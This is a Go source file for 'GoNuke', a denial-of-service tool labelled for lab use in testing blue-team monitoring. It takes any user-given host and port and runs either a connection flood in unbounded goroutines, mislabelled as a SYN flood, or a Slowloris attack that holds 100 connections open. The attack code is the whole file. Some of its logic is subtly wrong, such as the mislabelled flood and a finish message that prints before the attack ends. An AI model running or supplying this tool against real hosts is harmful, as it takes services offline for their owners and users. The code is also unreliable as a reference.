// GoNuke - Network Chaos Toolkit (Lab Use Only)
// Description: Tool to test blue team monitoring by generating network noise like SYN floods, malformed packets, slow HTTP attacks, etc.

package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
	"time"
)

var (
	targetHost = flag.String("host", "127.0.0.1", "Target IP address or hostname")
	targetPort = flag.String("port", "80", "Target port")
	attackType = flag.String("mode", "syn", "Attack type: syn | slowloris")
	duration   = flag.Int("duration", 30, "Duration of attack in seconds")
	logFile    = flag.String("log", "gonuke.log", "Log file path")
)

func main() {
	flag.Parse()

	f, err := os.OpenFile(*logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatalf("Failed to open log file: %v", err)
	}
	defer f.Close()
	log.SetOutput(f)

	log.Printf("[+] Starting %s attack on %s:%s for %d seconds\n", *attackType, *targetHost, *targetPort, *duration)
	fmt.Printf("[+] Starting %s attack on %s:%s for %d seconds\n", *attackType, *targetHost, *targetPort, *duration)

	switch strings.ToLower(*attackType) {
	case "syn":
		startSynFlood(*targetHost, *targetPort, *duration)
	case "slowloris":
		startSlowloris(*targetHost, *targetPort, *duration)
	default:
		log.Fatalf("Unknown mode: %s\n", *attackType)
	}
}

func startSynFlood(host, port string, seconds int) {
	end := time.Now().Add(time.Duration(seconds) * time.Second)
	for time.Now().Before(end) {
		go func() {
			conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%s", host, port), 2*time.Second)
			if err == nil {
				log.Printf("[SYN] Sent TCP packet to %s:%s\n", host, port)
				conn.Close()
			} else {
				log.Printf("[SYN] Failed TCP connection: %v\n", err)
			}
		}()
	}
	log.Println("[+] SYN flood finished")
	fmt.Println("[+] SYN flood finished")
}

func startSlowloris(host, port string, seconds int) {
	end := time.Now().Add(time.Duration(seconds) * time.Second)
	for i := 0; i < 100; i++ {
		go func() {
			conn, err := net.Dial("tcp", fmt.Sprintf("%s:%s", host, port))
			if err != nil {
				log.Printf("[Slowloris] Connection failed: %v\n", err)
				return
			}
			log.Printf("[Slowloris] Opened connection to %s:%s\n", host, port)
			for time.Now().Before(end) {
				_, err := conn.Write([]byte("X-a: b\r\n"))
				if err != nil {
					log.Printf("[Slowloris] Write error: %v\n", err)
					break
				}
				time.Sleep(10 * time.Second)
			}
			conn.Close()
			log.Printf("[Slowloris] Closed connection to %s:%s\n", host, port)
		}()
	}
	log.Println("[+] Slowloris attack finished")
	fmt.Println("[+] Slowloris attack finished")
}
